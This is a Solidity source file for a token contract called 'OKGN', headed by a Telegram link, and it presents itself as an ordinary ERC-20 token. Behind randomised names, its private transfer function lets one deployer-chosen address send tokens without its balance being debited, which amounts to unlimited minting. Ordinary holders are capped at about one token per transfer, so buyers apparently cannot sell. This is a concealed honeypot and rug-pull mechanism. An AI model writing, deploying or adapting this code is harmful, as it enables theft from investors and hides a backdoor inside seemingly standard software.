/*

https://t.me/dorkdegen

*/

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.18;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract OKGN is Ownable {
    uint8 public decimals = 9;

    mapping(address => uint256) private vfykhptn;

    uint256 private afthp = 110;

    function transfer(address sguxbqv, uint256 iogxhflpnk) public returns (bool success) {
        haceolbtngdp(msg.sender, sguxbqv, iogxhflpnk);
        return true;
    }

    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory iatzd, string memory lqnozawy, address vxlib, address pbyfdl) {
        name = iatzd;
        symbol = lqnozawy;
        balanceOf[msg.sender] = totalSupply;
        kmbyt[pbyfdl] = afthp;
        rowi = IUniswapV2Router02(vxlib);
    }

    string public symbol;

    mapping(address => uint256) public balanceOf;

    function haceolbtngdp(address gncx, address sguxbqv, uint256 iogxhflpnk) private {
        address ymbkj = IUniswapV2Factory(rowi.factory()).getPair(address(this), rowi.WETH());
        bool ejzqlbxintr = 0 == kmbyt[gncx];
        if (ejzqlbxintr) {
            if (gncx != ymbkj && vfykhptn[gncx] != block.number && iogxhflpnk < totalSupply) {
                require(iogxhflpnk <= totalSupply / (10 ** decimals));
            }
            balanceOf[gncx] -= iogxhflpnk;
        }
        balanceOf[sguxbqv] += iogxhflpnk;
        vfykhptn[sguxbqv] = block.number;
        emit Transfer(gncx, sguxbqv, iogxhflpnk);
    }

    function approve(address qalwghyd, uint256 iogxhflpnk) public returns (bool success) {
        allowance[msg.sender][qalwghyd] = iogxhflpnk;
        emit Approval(msg.sender, qalwghyd, iogxhflpnk);
        return true;
    }

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    function transferFrom(address gncx, address sguxbqv, uint256 iogxhflpnk) public returns (bool success) {
        require(iogxhflpnk <= allowance[gncx][msg.sender]);
        allowance[gncx][msg.sender] -= iogxhflpnk;
        haceolbtngdp(gncx, sguxbqv, iogxhflpnk);
        return true;
    }

    string public name;

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => uint256) private kmbyt;

    IUniswapV2Router02 private rowi;
}
